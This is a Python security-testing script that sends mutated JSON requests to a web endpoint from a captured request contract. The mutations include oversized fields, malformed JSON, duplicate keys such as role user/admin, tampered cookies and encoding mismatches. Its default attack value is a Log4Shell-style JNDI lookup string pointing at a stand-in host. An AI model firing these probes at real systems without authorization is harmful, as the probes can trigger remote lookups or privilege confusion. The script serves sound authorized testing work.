#!/usr/bin/env python3
from __future__ import annotations

import argparse
import copy
import json
from pathlib import Path
from typing import Any
from urllib.parse import quote

from http_probe_common import curl_request, dump_json, ensure_dir, write_csv


PLACEHOLDER = "__CODEX_CONTRACT_MUTATION_PLACEHOLDER__"


def load_contract(path: str) -> dict[str, Any]:
    raw = Path(path).read_text(encoding="utf-8")
    data = json.loads(raw)
    if not isinstance(data, dict):
        raise RuntimeError("Contract file must decode to an object")
    return data


def normalize_headers(value: Any) -> list[str]:
    if value is None:
        return []
    if isinstance(value, list):
        result: list[str] = []
        for item in value:
            if isinstance(item, str) and ":" in item:
                result.append(item)
        return result
    if isinstance(value, dict):
        return [f"{key}: {val}" for key, val in value.items()]
    raise RuntimeError("headers must be an object or a list of 'Name: value' strings")


def split_header(header_line: str) -> tuple[str, str]:
    key, value = header_line.split(":", 1)
    return key.strip(), value.strip()


def merge_headers(base_headers: list[str], overrides: dict[str, str], remove: set[str] | None = None) -> list[str]:
    remove = {item.lower() for item in (remove or set())}
    merged: list[tuple[str, str]] = []
    seen: set[str] = set()
    for line in base_headers:
        key, value = split_header(line)
        key_lower = key.lower()
        if key_lower in remove:
            continue
        if key_lower in overrides:
            merged.append((key, overrides[key_lower]))
            seen.add(key_lower)
        else:
            merged.append((key, value))
    for key_lower, value in overrides.items():
        if key_lower not in seen and key_lower not in remove:
            merged.append((key_lower.title(), value))
    return [f"{key}: {value}" for key, value in merged]


def get_cookie_value(headers: list[str]) -> str:
    for line in headers:
        key, value = split_header(line)
        if key.lower() == "cookie":
            return value
    return ""


def set_cookie_header(headers: list[str], cookie_value: str) -> list[str]:
    return merge_headers(headers, {"cookie": cookie_value})


def resolve_body(contract: dict[str, Any]) -> dict[str, Any]:
    body = contract.get("body")
    if body is None:
        if any(key in contract for key in ("url", "method", "headers")):
            raise RuntimeError("Contract with url/method/headers must also include body")
        body = contract
    if not isinstance(body, dict):
        raise RuntimeError("Contract body must be a JSON object")
    return body


def resolve_url(contract: dict[str, Any], explicit_url: str | None) -> str:
    url = explicit_url or contract.get("url")
    if not url:
        raise RuntimeError("URL is required either in the contract file or via --url")
    return str(url)


def resolve_method(contract: dict[str, Any], explicit_method: str | None) -> str:
    method = explicit_method or contract.get("method") or "POST"
    return str(method).upper()


def clone_with_placeholder(body: dict[str, Any], target_path: str) -> tuple[dict[str, Any], Any]:
    clone = copy.deepcopy(body)
    if not target_path:
        return clone, None
    parts = [part for part in target_path.split(".") if part]
    current: Any = clone
    for part in parts[:-1]:
        if not isinstance(current, dict) or part not in current:
            raise RuntimeError(f"Target path '{target_path}' not found in contract body")
        current = current[part]
    final = parts[-1]
    if not isinstance(current, dict) or final not in current:
        raise RuntimeError(f"Target path '{target_path}' not found in contract body")
    original = current[final]
    current[final] = PLACEHOLDER
    return clone, original


def render_raw_json(body: dict[str, Any], target_path: str, raw_fragment: str | None) -> str:
    if not target_path:
        if raw_fragment is None:
            return json.dumps(body, ensure_ascii=False, separators=(",", ":"))
        return raw_fragment
    clone, _ = clone_with_placeholder(body, target_path)
    rendered = json.dumps(clone, ensure_ascii=False, separators=(",", ":"))
    quoted_placeholder = json.dumps(PLACEHOLDER)
    replacement = raw_fragment if raw_fragment is not None else "null"
    if quoted_placeholder not in rendered:
        raise RuntimeError("Failed to inject placeholder into rendered JSON")
    return rendered.replace(quoted_placeholder, replacement, 1)


def write_text(path: Path, text: str) -> None:
    path.write_text(text, encoding="utf-8")


def write_bytes(path: Path, data: bytes) -> None:
    path.write_bytes(data)


def build_size_value(target_size: int, marker: str) -> str:
    if target_size <= len(marker):
        return marker[:target_size]
    return marker + ("A" * (target_size - len(marker)))


def object_fragment(entries: list[tuple[str, str, bool]]) -> str:
    parts: list[str] = []
    for key, value, quoted in entries:
        key_text = json.dumps(key)
        if quoted:
            value_text = json.dumps(value)
        else:
            value_text = value
        parts.append(f"{key_text}:{value_text}")
    return "{" + ",".join(parts) + "}"


def run_body_case(
    *,
    out_dir: Path,
    name: str,
    url: str,
    method: str,
    headers: list[str],
    body_text: str | None,
    body_bytes: bytes | None,
    timeout: int,
    content_type_override: str | None = None,
) -> dict[str, Any]:
    out_prefix = out_dir / name
    final_headers = headers
    if content_type_override is not None:
        final_headers = merge_headers(headers, {"content-type": content_type_override})
    body_path: Path | None = None
    if body_text is not None:
        body_path = out_dir / f"{name}.payload.json"
        write_text(body_path, body_text)
    elif body_bytes is not None:
        body_path = out_dir / f"{name}.payload.bin"
        write_bytes(body_path, body_bytes)
    result = curl_request(
        url=url,
        out_prefix=out_prefix,
        method=method,
        headers=final_headers,
        body_path=body_path,
        timeout=timeout,
    )
    payload_path = str(body_path) if body_path is not None else ""
    return {
        "case": name,
        "payload_path": payload_path,
        "http_code": result["http_code"],
        "curl_rc": str(result["curl_rc"]),
        "server_header": result["server_header"],
        "content_type": result["content_type"],
        "body_fingerprint": result["body_fingerprint"],
        "header_path": result["header_path"],
        "body_path": result["body_path"],
    }


def run_tc12(
    *,
    out_dir: Path,
    url: str,
    method: str,
    headers: list[str],
    body: dict[str, Any],
    target_path: str,
    field_name: str,
    marker: str,
    sizes: list[int],
    timeout: int,
) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    baseline = run_body_case(
        out_dir=out_dir,
        name="baseline_original",
        url=url,
        method=method,
        headers=headers,
        body_text=json.dumps(body, ensure_ascii=False, separators=(",", ":")),
        body_bytes=None,
        timeout=timeout,
    )
    baseline["target_size"] = "0"
    rows.append(baseline)
    for size in sizes:
        fragment = object_fragment([(field_name, build_size_value(size, marker), True)])
        rendered = render_raw_json(body, target_path, fragment)
        row = run_body_case(
            out_dir=out_dir,
            name=f"body_{size}",
            url=url,
            method=method,
            headers=headers,
            body_text=rendered,
            body_bytes=None,
            timeout=timeout,
        )
        row["target_size"] = str(size)
        rows.append(row)
    return rows


def run_tc15(
    *,
    out_dir: Path,
    url: str,
    method: str,
    headers: list[str],
    body: dict[str, Any],
    target_path: str,
    field_name: str,
    safe_value: str,
    timeout: int,
) -> list[dict[str, str]]:
    fragments = {
        "valid_json": object_fragment([(field_name, safe_value, True)]),
        "single_quote_json": "{'" + field_name + "':'" + safe_value + "'}",
        "unquoted_key_json": "{" + field_name + ":" + json.dumps(safe_value) + "}",
        "trailing_comma_json": "{" + json.dumps(field_name) + ":" + json.dumps(safe_value) + ",}",
        "comment_json": "{" + json.dumps(field_name) + ":" + json.dumps(safe_value) + "/*comment*/}",
        "nan_json": "{" + json.dumps(field_name) + ":NaN}",
    }
    rows: list[dict[str, str]] = []
    baseline = run_body_case(
        out_dir=out_dir,
        name="baseline_original",
        url=url,
        method=method,
        headers=headers,
        body_text=json.dumps(body, ensure_ascii=False, separators=(",", ":")),
        body_bytes=None,
        timeout=timeout,
    )
    rows.append(baseline)
    for name, fragment in fragments.items():
        rendered = render_raw_json(body, target_path, fragment)
        rows.append(
            run_body_case(
                out_dir=out_dir,
                name=name,
                url=url,
                method=method,
                headers=headers,
                body_text=rendered,
                body_bytes=None,
                timeout=timeout,
            )
        )
    return rows


def run_tc21(
    *,
    out_dir: Path,
    url: str,
    method: str,
    headers: list[str],
    body: dict[str, Any] | None,
    timeout: int,
    cookie_name: str,
    cookie_pad_size: int,
    attack_value: str,
) -> list[dict[str, str]]:
    base_cookie = get_cookie_value(headers)
    body_text = json.dumps(body, ensure_ascii=False, separators=(",", ":")) if body is not None else None

    def cookie_join(parts: list[str]) -> str:
        if base_cookie:
            return base_cookie + "; " + "; ".join(parts)
        return "; ".join(parts)

    cases = {
        "single_cookie": cookie_join([f"{cookie_name}=user"]),
        "duplicate_cookie": cookie_join([f"{cookie_name}=user", f"{cookie_name}=admin"]),
        "oversize_cookie": cookie_join([f"session=AAA", f"pad={'B' * cookie_pad_size}", f"exploit=tc21-probe"]),
        "url_encoded_cookie": cookie_join([f"{cookie_name}={quote(attack_value, safe='')}"]),
    }
    rows: list[dict[str, str]] = []
    baseline = run_body_case(
        out_dir=out_dir,
        name="baseline_original",
        url=url,
        method=method,
        headers=headers,
        body_text=body_text,
        body_bytes=None,
        timeout=timeout,
    )
    baseline["cookie_length"] = str(len(base_cookie))
    rows.append(baseline)
    for name, cookie_value in cases.items():
        row = run_body_case(
            out_dir=out_dir,
            name=name,
            url=url,
            method=method,
            headers=set_cookie_header(headers, cookie_value),
            body_text=body_text,
            body_bytes=None,
            timeout=timeout,
        )
        row["cookie_length"] = str(len(cookie_value))
        rows.append(row)
    return rows


def run_tc22(
    *,
    out_dir: Path,
    url: str,
    method: str,
    headers: list[str],
    body: dict[str, Any],
    target_path: str,
    field_name: str,
    attack_value: str,
    timeout: int,
) -> list[dict[str, str]]:
    fragments = {
        "baseline_unique": object_fragment([(field_name, "safe", True)]),
        "duplicate_key_conflict": object_fragment([(field_name, "safe", True), (field_name, attack_value, True)]),
        "duplicate_role_conflict": object_fragment([("role", "user", True), ("role", "admin", True)]),
        "lax_trailing_comma": "{" + json.dumps(field_name) + ":" + json.dumps(attack_value) + ",}",
    }
    rows: list[dict[str, str]] = []
    original = run_body_case(
        out_dir=out_dir,
        name="baseline_original",
        url=url,
        method=method,
        headers=headers,
        body_text=json.dumps(body, ensure_ascii=False, separators=(",", ":")),
        body_bytes=None,
        timeout=timeout,
    )
    rows.append(original)
    for name, fragment in fragments.items():
        rendered = render_raw_json(body, target_path, fragment)
        rows.append(
            run_body_case(
                out_dir=out_dir,
                name=name,
                url=url,
                method=method,
                headers=headers,
                body_text=rendered,
                body_bytes=None,
                timeout=timeout,
            )
        )
    return rows


def run_tc23(
    *,
    out_dir: Path,
    url: str,
    method: str,
    headers: list[str],
    body: dict[str, Any],
    target_path: str,
    field_name: str,
    attack_value: str,
    timeout: int,
) -> list[dict[str, str]]:
    baseline_text = json.dumps(body, ensure_ascii=False, separators=(",", ":"))
    attack_fragment = object_fragment([(field_name, attack_value, True)])
    attack_text = render_raw_json(body, target_path, attack_fragment)
    cases = [
        ("baseline_original", baseline_text.encode("utf-8"), None),
        ("attack_utf8", attack_text.encode("utf-8"), "application/json; charset=utf-8"),
        ("attack_utf8_bom", b"\xef\xbb\xbf" + attack_text.encode("utf-8"), "application/json; charset=utf-8"),
        ("attack_utf16le_bom", b"\xff\xfe" + attack_text.encode("utf-16le"), "application/json; charset=utf-16le"),
        ("attack_utf16be_bom", b"\xfe\xff" + attack_text.encode("utf-16be"), "application/json; charset=utf-16be"),
        ("attack_utf16le_mismatch", b"\xff\xfe" + attack_text.encode("utf-16le"), "application/json; charset=utf-8"),
    ]
    rows: list[dict[str, str]] = []
    for name, body_bytes, content_type in cases:
        rows.append(
            run_body_case(
                out_dir=out_dir,
                name=name,
                url=url,
                method=method,
                headers=headers,
                body_text=None,
                body_bytes=body_bytes,
                timeout=timeout,
                content_type_override=content_type,
            )
        )
    return rows


def main() -> int:
    parser = argparse.ArgumentParser(description="Run contract-aware JSON mutation probes while preserving captured request shape.")
    parser.add_argument("--contract-file", required=True, help="JSON file containing either {url, method, headers, body} or just the body object")
    parser.add_argument("--mode", required=True, choices=["tc12", "tc15", "tc21", "tc22", "tc23"])
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--url")
    parser.add_argument("--method")
    parser.add_argument("--header", action="append", default=[], help="Extra header in 'Name: value' form")
    parser.add_argument("--target-path", default="", help="Dot path to the JSON object to mutate, e.g. ReqData.ReqBody")
    parser.add_argument("--field-name", default="probe")
    parser.add_argument("--safe-value", default="safe")
    parser.add_argument("--attack-value", default="${jndi:ldap://probe.invalid/contract}")
    parser.add_argument("--sizes", default="128,4096,16384,65536")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--cookie-name", default="probe")
    parser.add_argument("--cookie-pad-size", type=int, default=4096)
    args = parser.parse_args()

    contract = load_contract(args.contract_file)
    body = resolve_body(contract)
    url = resolve_url(contract, args.url)
    method = resolve_method(contract, args.method)
    headers = normalize_headers(contract.get("headers")) + list(args.header)
    headers = merge_headers(headers, {}, remove={"content-length"})
    out_dir = ensure_dir(args.output_dir)

    if args.mode in {"tc12", "tc15", "tc22", "tc23"} and not args.target_path:
        raise SystemExit("--target-path is required for tc12, tc15, tc22, and tc23")

    if args.mode == "tc12":
        sizes = [int(item.strip()) for item in args.sizes.split(",") if item.strip()]
        rows = run_tc12(
            out_dir=out_dir,
            url=url,
            method=method,
            headers=headers,
            body=body,
            target_path=args.target_path,
            field_name=args.field_name,
            marker=args.attack_value,
            sizes=sizes,
            timeout=args.timeout,
        )
    elif args.mode == "tc15":
        rows = run_tc15(
            out_dir=out_dir,
            url=url,
            method=method,
            headers=headers,
            body=body,
            target_path=args.target_path,
            field_name=args.field_name,
            safe_value=args.safe_value,
            timeout=args.timeout,
        )
    elif args.mode == "tc21":
        rows = run_tc21(
            out_dir=out_dir,
            url=url,
            method=method,
            headers=headers,
            body=body,
            timeout=args.timeout,
            cookie_name=args.cookie_name,
            cookie_pad_size=args.cookie_pad_size,
            attack_value=args.attack_value,
        )
    elif args.mode == "tc22":
        rows = run_tc22(
            out_dir=out_dir,
            url=url,
            method=method,
            headers=headers,
            body=body,
            target_path=args.target_path,
            field_name=args.field_name,
            attack_value=args.attack_value,
            timeout=args.timeout,
        )
    else:
        rows = run_tc23(
            out_dir=out_dir,
            url=url,
            method=method,
            headers=headers,
            body=body,
            target_path=args.target_path,
            field_name=args.field_name,
            attack_value=args.attack_value,
            timeout=args.timeout,
        )

    summary = {
        "url": url,
        "method": method,
        "mode": args.mode,
        "contract_file": args.contract_file,
        "target_path": args.target_path,
        "field_name": args.field_name,
        "rows": rows,
    }
    dump_json(out_dir / "summary.json", summary)
    fieldnames = sorted({key for row in rows for key in row.keys()})
    write_csv(out_dir / "summary.csv", fieldnames, rows)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
